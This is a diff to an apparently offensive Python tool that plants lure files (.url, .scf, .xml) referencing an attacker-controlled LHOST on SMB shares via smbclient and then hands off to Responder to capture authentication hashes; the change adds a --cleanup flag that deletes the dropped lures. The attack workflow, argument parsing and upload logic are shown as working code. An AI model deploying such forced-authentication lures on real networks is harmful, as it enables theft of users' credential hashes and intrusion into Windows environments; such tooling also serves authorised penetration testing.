@@ -92,13 +92,16 @@ def make_xml(lhost, basename="@lure"):
     return path
 
 
-def smb_put(host, share, payloads, *, sub_dir=None,
+def smb_put(host, share, payloads, *, delete=False, sub_dir=None,
             user=None, password=None, domain=None):
-    """Upload payload files to an SMB share via smbclient.
+    """Upload (or delete) payload files on an SMB share via smbclient.
 
     Builds an argv list and invokes smbclient without a shell, so
     user-supplied values (host, share, sub_dir, credentials) cannot be
     interpreted as shell metacharacters.
+
+    When delete=True, sends `del` commands instead of `put` — used by
+    --cleanup to remove previously dropped payloads from the share.
     """
     cmd = ["smbclient", f"//{host}/{share}"]
     if user is not None and password is not None:
@@ -110,14 +113,16 @@ def smb_put(host, share, payloads, *, sub_dir=None,
     # smbclient -c takes a script in smbclient's own command grammar
     # (";" separates commands). Filenames are double-quoted for paths
     # that may contain spaces.
+    verb = "del" if delete else "put"
     script_parts = []
     if sub_dir:
         script_parts.append(f'cd "{sub_dir}"')
-    script_parts.extend(f'put "{p}"' for p in payloads)
+    script_parts.extend(f'{verb} "{p}"' for p in payloads)
     cmd.extend(["-c", "; ".join(script_parts)])
 
+    action = "Deleting" if delete else "Uploading"
     target = f"//{host}/{share}" + (f"/{sub_dir}" if sub_dir else "")
-    print(BLUE + f"[*] Uploading {len(payloads)} payload(s) to {target}" + RESET)
+    print(BLUE + f"[*] {action} {len(payloads)} payload(s) at {target}" + RESET)
     return subprocess.run(cmd).returncode
 
 
@@ -151,6 +156,7 @@ def main():
     parser.add_argument("-A", "--All", action="store_true", help="Drop all three payloads (@lure.url, @lure.scf, @lure.xml)")
     parser.add_argument("--name", action="store", default="@lure", metavar="BASE", help="Payload basename (default keeps the @ prefix to sort to the top of directory listings)")
     parser.add_argument("--no-responder", dest="no_responder", action="store_true", help="Drop the payload only — skip the Responder handoff (use when you already have a listener running)")
+    parser.add_argument("--cleanup", action="store_true", help="Delete previously dropped payloads from the share (uses the same payload-type and --name flags). Implies --no-responder.")
 
     if not sys.argv[1:]:
         parser.print_help()
@@ -167,25 +173,38 @@ def main():
         print(RED + "Need password if utilizing a username" + RESET)
         sys.exit(2)
 
-    _check_prereqs(needs_responder=not args.no_responder)
+    # --cleanup implies --no-responder (nothing to listen for).
+    skip_responder = args.no_responder or args.cleanup
+    _check_prereqs(needs_responder=not skip_responder)
 
-    # Resolve which payloads to generate (explicit flags or --All).
+    # Resolve which payloads the action applies to (explicit flags or --All).
     want_url = args.url or args.All
     want_scf = args.scf or args.All
     want_xml = args.xml or args.All
 
-    payloads = []
-    if want_url:
-        payloads.append(make_url(args.LHOST, args.name))
-    if want_scf:
-        payloads.append(make_scf(args.LHOST, args.name))
-    if want_xml:
-        payloads.append(make_xml(args.LHOST, args.name))
+    if args.cleanup:
+        # Don't regenerate locally — just compute the remote filenames.
+        payloads = []
+        if want_url:
+            payloads.append(Path(f"{args.name}.url"))
+        if want_scf:
+            payloads.append(Path(f"{args.name}.scf"))
+        if want_xml:
+            payloads.append(Path(f"{args.name}.xml"))
+    else:
+        payloads = []
+        if want_url:
+            payloads.append(make_url(args.LHOST, args.name))
+        if want_scf:
+            payloads.append(make_scf(args.LHOST, args.name))
+        if want_xml:
+            payloads.append(make_xml(args.LHOST, args.name))
 
     rc = smb_put(
         args.RHOST,
         args.Share,
         payloads,
+        delete=args.cleanup,
         sub_dir=args.Other,
         user=args.Username,
         password=args.Password,
@@ -195,6 +214,9 @@ def main():
         print(RED + f"[-] smbclient exited with code {rc}" + RESET)
         sys.exit(rc)
 
+    if args.cleanup:
+        print(GREEN + f"[+] Removed {len(payloads)} payload(s) from the share." + RESET)
+        return
     if args.no_responder:
         print(GREEN + "[+] Payload(s) dropped. Skipping Responder (--no-responder)." + RESET)
         return
